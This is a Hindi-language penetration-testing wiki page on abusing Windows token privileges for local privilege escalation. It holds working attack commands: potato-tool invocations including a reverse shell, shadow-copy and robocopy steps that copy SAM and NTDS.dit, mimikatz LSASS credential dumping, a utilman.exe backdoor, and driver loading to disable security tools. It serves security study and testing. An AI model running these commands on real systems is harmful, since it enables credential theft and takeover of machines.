# Tokens का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## Tokens

यदि आप **Windows Access Tokens क्या हैं, यह नहीं जानते**, तो आगे बढ़ने से पहले यह पेज पढ़ें:


{{#ref}}
access-tokens.md
{{#endref}}

**आप अपने पास पहले से मौजूद tokens का दुरुपयोग करके privileges escalate कर सकते हैं।**

### SeImpersonatePrivilege

यह privilege किसी process को token की impersonate करने देता है (लेकिन token बनाने नहीं), बशर्ते वह उस token का handle प्राप्त कर सके। किसी Windows service (DCOM) को किसी exploit के विरुद्ध NTLM authentication करने के लिए प्रेरित करके उससे privileged token हासिल किया जा सकता है। इसके बाद SYSTEM privileges के साथ process चलाना संभव हो जाता है।<sup>[[2]](#references)</sup> इस primitive का फ़ायदा [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (जिसके लिए WinRM disabled होना ज़रूरी है), [SweetPotato](https://github.com/CCob/SweetPotato), और [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) जैसे tools से उठाया जा सकता है।

यदि कोई local user ऐसे authenticated endpoint तक पहुँच सकता है जो अधिक privileged identity के अंतर्गत caller द्वारा चुने गए URL पर request भेजता है, तो loopback-only web application coercion की एक अलग संभावना हो सकती है। Endpoint के authorization और URL restrictions, outbound client की वास्तविक identity और authentication behavior, और यह जाँचें कि क्या वह client ऐसे listener तक पहुँच सकता है जिसे lower-privileged user नियंत्रित करता है। केवल `SeImpersonatePrivilege` enabled होना, IIS listener होना, या URL-fetch parameter होना privileged token या escalation path साबित नहीं करता। यह जाँच passive रखें; enumeration के दौरान coercion requests न भेजें। Microsoft के [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) और [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) दस्तावेज़ देखें।

आधुनिक operator notes:

- **JuicyPotato पुराना है**: Windows 10 1809+/Server 2019+ पर, जो RPC/COM surface अभी भी reachable हो, उसके अनुसार **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, या **PrintSpoofer** को प्राथमिकता दें।
- यदि आपने **`LOCAL SERVICE`** या **`NETWORK SERVICE`** के रूप में चल रही service को compromise किया है और `whoami /priv` में `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` के बिना **filtered token** दिखता है, तो पहले account का **default privilege set** वापस पाएँ (उदाहरण के लिए **FullPowers** से), फिर potato family के tools दोबारा आज़माएँ।<sup>[[3]](#references)</sup>
- कुछ नए forks मूल tools की तुलना में operators के लिए अधिक सुविधाजनक हैं। उदाहरण के लिए, **SigmaPotato** reflection/in-memory execution और आधुनिक Windows compatibility जोड़ता है, जबकि **PrintNotifyPotato** PrintNotify COM service का दुरुपयोग करता है और classic Spooler path disabled होने पर अक्सर उपयोगी होता है।

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

यह **SeImpersonatePrivilege** से बहुत मिलता-जुलता है और privileged token पाने के लिए **वही method** इस्तेमाल करता है।\
इसके बाद, यह privilege किसी नए/suspended process को **primary token assign** करने की अनुमति देता है। Privileged impersonation token से आप primary token बना सकते हैं (DuplicateTokenEx)।\
इस token के साथ, आप 'CreateProcessAsUser' का उपयोग करके **नया process** बना सकते हैं या process को suspended बनाकर **token set** कर सकते हैं (आमतौर पर, किसी running process का primary token संशोधित नहीं किया जा सकता)।<sup>[[2]](#references)</sup>

### SeTcbPrivilege

अगर आपने यह token enable किया है, तो आप credentials जाने बिना किसी भी दूसरे user के लिए **impersonation token** पाने के लिए **KERB_S4U_LOGON** का उपयोग कर सकते हैं, token में कोई भी **arbitrary group** (admins) जोड़ सकते हैं, token का **integrity level** "**medium**" पर set कर सकते हैं और यह token **current thread** को assign कर सकते हैं (SetThreadToken)।<sup>[[2]](#references)</sup>

### SeBackupPrivilege

इस privilege के कारण system किसी भी file पर सभी read access की अनुमति देता है (यह केवल read operations तक सीमित है)। इसका उपयोग registry से local Administrator accounts के **password hashes पढ़ने** के लिए किया जाता है; इसके बाद, hash के साथ "**psexec**" या "**wmiexec**" जैसे tools इस्तेमाल किए जा सकते हैं (Pass-the-Hash technique)। हालांकि, यह technique दो स्थितियों में विफल होती है: जब Local Administrator account disabled हो, या जब कोई policy remotely connect करने वाले Local Administrators से administrative rights हटा देती हो।<sup>[[2]](#references)</sup>\
व्यवहार में, सबसे भरोसेमंद built-in workflow आमतौर पर **VSS + `robocopy /b`** होता है: shadow copy बनाएं/expose करें, फिर `SAM`/`SYSTEM` या `NTDS.dit` को **backup mode** में copy करें, जो file ACLs को bypass करता है।<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

आप इस **privilege का दुरुपयोग** इन तरीकों से कर सकते हैं:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec) को फ़ॉलो करके
- या नीचे दिए गए **Backup Operators के साथ privileges बढ़ाना** सेक्शन में बताए अनुसार:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

यह privilege किसी भी system file पर **write access** देता है, चाहे उस file की Access Control List (ACL) कुछ भी हो। इससे privileges बढ़ाने के कई रास्ते खुलते हैं, जिनमें **services को modify करना**, DLL Hijacking करना और Image File Execution Options के ज़रिए **debuggers** सेट करना शामिल है।<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege एक शक्तिशाली permission है। यह विशेष रूप से तब उपयोगी है जब किसी user के पास tokens को impersonate करने की क्षमता हो, लेकिन SeImpersonatePrivilege न होने पर भी काम आ सकता है। यह क्षमता ऐसे token को impersonate करने पर निर्भर करती है जो उसी user का प्रतिनिधित्व करता हो और जिसका integrity level मौजूदा process के integrity level से अधिक न हो।<sup>[[2]](#references)</sup>

**मुख्य बातें:**

- **SeImpersonatePrivilege के बिना Impersonation:** कुछ खास शर्तों के तहत, EoP के लिए SeCreateTokenPrivilege का इस्तेमाल करके tokens को impersonate किया जा सकता है।
- **Token Impersonation की शर्तें:** सफल impersonation के लिए target token उसी user का होना चाहिए और उसका integrity level, impersonation की कोशिश कर रहे process के integrity level से कम या बराबर होना चाहिए।
- **Impersonation Tokens बनाना और Modify करना:** Users एक impersonation token बना सकते हैं और उसमें किसी privileged group का SID (Security Identifier) जोड़कर उसे अधिक शक्तिशाली बना सकते हैं।

### SeLoadDriverPrivilege

यह privilege किसी process को `ImagePath` और `Type` की खास values वाली registry entry बनाकर **device drivers load और unload** करने देता है। चूँकि `HKLM` (HKEY_LOCAL_MACHINE) पर सीधे write access प्रतिबंधित है, इसलिए इसके बजाय `HKCU` (HKEY_CURRENT_USER) का इस्तेमाल किया जा सकता है। हालाँकि, `HKCU` entry को kernel द्वारा driver configuration के रूप में पहचाने जाने के लिए एक खास path ज़रूरी है।<sup>[[2]](#references)</sup>

आधुनिक offensive उपयोग में आम तौर पर **BYOVD** (bring your own vulnerable driver) का इस्तेमाल होता है: एक **signed लेकिन vulnerable** kernel driver load करें और फिर उसकी IOCTLs का उपयोग करके protections को disable करें या kernel code execution तक पहुँचें। ध्यान रखें कि हाल के Windows 11/Server builds में **Microsoft vulnerable driver blocklist** और/या **HVCI/Memory Integrity** अक्सर पुराने public chains को काम नहीं करने देते, इसलिए `szkg64.sys` जैसे classic examples अब हर जगह भरोसेमंद नहीं हैं।

यह path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` है, जहाँ `<RID>` मौजूदा user का Relative Identifier है। `HKCU` के अंदर यह पूरा path बनाना होगा और दो values सेट करनी होंगी:<sup>[[2]](#references)</sup>

- `ImagePath`, जो execute की जाने वाली binary का path है
- `Type`, जिसकी value `SERVICE_KERNEL_DRIVER` (`0x00000001`) होगी।

**पालन करने के चरण:**

1. Write access प्रतिबंधित होने के कारण `HKLM` के बजाय `HKCU` का उपयोग करें।
2. `HKCU` के अंदर `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path बनाएँ, जहाँ `<RID>` मौजूदा user का Relative Identifier है।
3. `ImagePath` को binary के execution path पर सेट करें।
4. `Type` को `SERVICE_KERNEL_DRIVER` (`0x00000001`) पर सेट करें।

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

इस privilege का दुरुपयोग करने के और तरीके: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

यह **SeRestorePrivilege** के समान है। इसका मुख्य कार्य किसी process को **किसी object का ownership लेने** की अनुमति देना है। ऐसा WRITE_OWNER access rights देकर explicit discretionary access की आवश्यकता को दरकिनार करके किया जाता है। इस प्रक्रिया में पहले इच्छित registry key का ownership लेकर उसे लिखने योग्य बनाया जाता है, फिर write operations सक्षम करने के लिए DACL में बदलाव किया जाता है।<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

यह privilege **अन्य processes को debug करने** की अनुमति देता है, जिसमें उनकी memory को पढ़ना और लिखना भी शामिल है। इस privilege के साथ memory injection की विभिन्न strategies इस्तेमाल की जा सकती हैं, जो अधिकांश antivirus और host intrusion prevention solutions से बच निकलने में सक्षम हैं।<sup>[[2]](#references)</sup>

आधुनिक Windows में ध्यान रखें कि `SeDebugPrivilege` आम तौर पर **non-protected SYSTEM processes** को खोलने और उनके tokens की duplicate बनाने के लिए पर्याप्त है, लेकिन यह इस बात की **गारंटी नहीं** है कि आप **LSASS** तक पहुँच सकते हैं। अगर **RunAsPPL / LSA Protection** enabled है, तो `SeDebugPrivilege` मौजूद होने पर भी non-protected processes, LSASS को पढ़ या उसमें inject नहीं कर सकते। ऐसी स्थिति में, किसी दूसरे non-PPL SYSTEM process से token चुराएँ, या यह मानने के बजाय कि `procdump` काम करेगा, PPL bypass/BYOVD के साथ chain करें। `SeDebugPrivilege` + `SeImpersonatePrivilege` का इस्तेमाल करके token copy करने का पूरा उदाहरण देखने के लिए [यह पेज](sedebug-+-seimpersonate-copy-token.md) देखें।

#### Memory dump करें

किसी process की **memory capture** करने के लिए, [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) के [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) का इस्तेमाल किया जा सकता है। विशेष रूप से, यह **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process पर लागू हो सकता है, जो user के किसी system में सफलतापूर्वक log in करने के बाद उसके credentials को store करने के लिए ज़िम्मेदार है।

इसके बाद passwords पाने के लिए इस dump को mimikatz में load कर सकते हैं:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

पहले से सहेजा गया, पढ़ने योग्य LSASS dump उपलब्ध हो सकता है, भले ही मौजूदा account के पास live protected process को capture करने की अनुमति न हो। किसी dump file या इसी तरह नाम वाले archive को केवल एक संकेत मानें: access और contents की पुष्टि करें, फिर जाँचें कि बरामद credentials अब भी valid हैं या नहीं और क्या वे higher-privilege context देते हैं। केवल file names से यह साबित नहीं होता कि archive में dump है या credentials दोबारा इस्तेमाल किए जा सकते हैं।

#### RCE

अगर आप `NT SYSTEM` shell पाना चाहते हैं, तो ये इस्तेमाल कर सकते हैं:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

यह अधिकार (volume maintenance tasks करना) privileged volume operations में सहायक हो सकता है, लेकिन इससे अपने-आप readable raw-volume handle या arbitrary file access की गारंटी नहीं मिलती। Device ACLs, token state, Windows version और अनुरोधित operation अब भी मायने रखते हैं। अनुमति-प्राप्त volume-control operation इसके बजाय filesystem ACLs बदल सकता है; यह एक mutating और संभावित रूप से पूरे volume को प्रभावित करने वाली कार्रवाई है। CA host पर certificate abuse के लिए usable private-key material तक access भी आवश्यक है, और EFS-protected files के लिए अब भी authorized decryption या recovery key की ज़रूरत होती है। विस्तृत prerequisites नीचे देखें।<sup>[[5]](#references)</sup>

विस्तृत techniques और mitigations देखें:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Privileges जाँचें

```
whoami /priv
```

**Disabled** के रूप में दिखने वाले tokens को आमतौर पर सक्षम किया जा सकता है, इसलिए आप अक्सर _Enabled_ और _Disabled_ दोनों privileges का दुरुपयोग कर सकते हैं।

### सभी tokens सक्षम करें

यदि आपके पास disabled privileges हैं, तो सभी tokens सक्षम करने के लिए आप [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script का उपयोग कर सकते हैं:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

या [**पोस्ट**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) में एम्बेड की गई **script** भी।

## Table

सभी token privileges की पूरी cheatsheet [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) पर है; नीचे दिए गए सारांश में केवल privilege का फायदा उठाकर admin session पाने या संवेदनशील फ़ाइलें पढ़ने के सीधे तरीके सूचीबद्ध हैं।<sup>[[1]](#references)</sup>

| Privilege                  | प्रभाव       | टूल                    | निष्पादन का तरीका                                                                                                                                                                                                                                                                                                                                     | टिप्पणियाँ                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | तृतीय-पक्ष टूल          | _"इससे उपयोगकर्ता tokens का impersonation करके potato.exe, rottenpotato.exe और juicypotato.exe जैसे टूल का उपयोग करके nt system तक privesc करना संभव होगा"_                                                                                                                                                                                                      | इस अपडेट के लिए [Aurélien Chalot](https://twitter.com/Defte_) का धन्यवाद। जल्द ही इसे किसी recipe की तरह और स्पष्ट रूप में लिखने की कोशिश करूँगा।                                                                                                                                                                                         |
| **`SeBackup`**             | **खतरा**  | _**Built-in commands**_ | `robocopy /b` या SeBackup को सपोर्ट करने वाले विशेष copy helpers से संवेदनशील फ़ाइलें पढ़ें।                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, और कभी-कभी `%WINDIR%\MEMORY.DMP` के लिए उपयोगी।<br><br>- `robocopy` सुविधाजनक है, लेकिन विशेष SeBackup cmdlets/APIs अक्सर locked/open files के लिए अधिक लचीले होते हैं।</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | तृतीय-पक्ष टूल          | `NtCreateToken` से local admin rights वाला मनमाना token बनाएँ।                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | किसी **non-PPL** SYSTEM token की duplicate बनाएँ या किसी non-protected process की memory dump करें।                                                                                                                                                                                                                                                                 | <p>यदि RunAsPPL/LSA Protection enabled है, तो LSASS dumping आम तौर पर blocked होती है।</p><p>Script [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) पर उपलब्ध है।</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | तृतीय-पक्ष टूल          | SYSTEM spawn करने के लिए **Potato family** / named-pipe impersonation का उपयोग करें (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, आदि)।                                                                                                                                                                                    | <p>यह service accounts जैसे IIS APPPOOL, MSSQL, scheduled tasks या ऐसे किसी भी context से सबसे व्यावहारिक है जिसके पास पहले से `SeImpersonatePrivilege` है।</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | तृतीय-पक्ष टूल          | <p>1. signed-but-vulnerable kernel driver (BYOVD) load करें<br>2. kernel R/W पाने, security tooling disable करने या SYSTEM तक elevate करने के लिए driver के IOCTLs का उपयोग करें<br><br>वैकल्पिक रूप से, इस privilege का उपयोग builtin command <code>fltMC</code> से security-related drivers unload करने के लिए किया जा सकता है, जैसे <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> जैसे पुराने public drivers को modern Windows पर vulnerable-driver blocklist / HVCI द्वारा increasingly blocked किया जा रहा है।</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege मौजूद होने पर PowerShell/ISE launch करें।<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> से privilege enable करें।<br>3. utilman.exe का नाम बदलकर utilman.old करें<br>4. cmd.exe का नाम बदलकर utilman.exe करें<br>5. console lock करें और Win+U दबाएँ</p> | <p>कुछ AV software इस attack का पता लगा सकते हैं।</p><p>वैकल्पिक तरीका इसी privilege का उपयोग करके "Program Files" में रखी service binaries को replace करने पर निर्भर करता है।</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe का नाम बदलकर utilman.exe करें<br>4. console lock करें और Win+U दबाएँ</p>                                                                                                                                       | <p>कुछ AV software इस attack का पता लगा सकते हैं।</p><p>वैकल्पिक तरीका इसी privilege का उपयोग करके "Program Files" में रखी service binaries को replace करने पर निर्भर करता है।</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | तृतीय-पक्ष टूल          | <p>tokens में local admin rights शामिल करने के लिए उनमें बदलाव करें। इसके लिए SeImpersonate की आवश्यकता हो सकती है।</p><p>सत्यापन बाकी है।</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privileges से admin तक के exploitation paths](https://github.com/gtworek/Priv2Admin)
- [2] [LPE के लिए Token Privileges का दुरुपयोग](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – मेरे privileges वापस दिलाओ! प्लीज़?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode, file/folder ACL checks को bypass करता है)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volume maintenance tasks करना (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
